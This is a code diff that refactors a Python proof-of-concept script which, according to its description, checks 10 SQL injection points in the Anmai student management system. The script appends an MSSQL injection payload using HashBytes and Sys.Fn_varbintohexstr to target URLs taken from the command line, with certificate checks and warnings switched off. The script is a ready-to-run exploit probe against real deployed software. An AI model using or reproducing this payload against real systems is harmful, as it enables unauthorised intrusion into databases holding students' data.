@@ -9,14 +9,7 @@ description: 10处SQL注入。
 import sys
 import requests
 import warnings
-
-
-
-class anmai_teachingtechnology_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['安脉学生管理系统10处SQL注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -36,7 +29,7 @@ class anmai_teachingtechnology_sqli:
         try:
             noexist = True
             for turl in urls:
-                vulnurl = self.url + turl
+                vulnurl = url + turl
                 vulnurl = vulnurl + "'+AnD+1=Sys.Fn_varbintohexstr(HashBytes('Md5','1234'))--"
 
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
@@ -52,5 +45,5 @@ class anmai_teachingtechnology_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = anmai_teachingtechnology_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
